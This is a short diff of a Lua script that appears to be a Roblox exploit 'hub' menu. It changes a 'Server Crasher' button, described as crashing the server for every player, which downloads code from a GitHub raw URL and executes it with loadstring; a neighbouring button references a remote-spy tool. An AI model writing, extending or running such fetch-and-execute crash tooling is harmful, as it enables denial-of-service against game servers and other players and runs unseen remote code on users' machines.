@@ -40,7 +40,7 @@ MainSection:NewButton("Hydroxide", "Like RemoteSpy" , function()
 end)
 
 MainSection:NewButton("Server Crasher", "Completely crashes the server (crashes you and all players)" , function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Cr1tacl/Winter-s-Hub/main/Server%20crasher%20(included%20in%20hubcredit%20to%20john%20crash)"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Cr1tacl/Winter-s-Hub/main/servercrash.lua"))()
 end)
  
 local Player = Window:NewTab("Player")
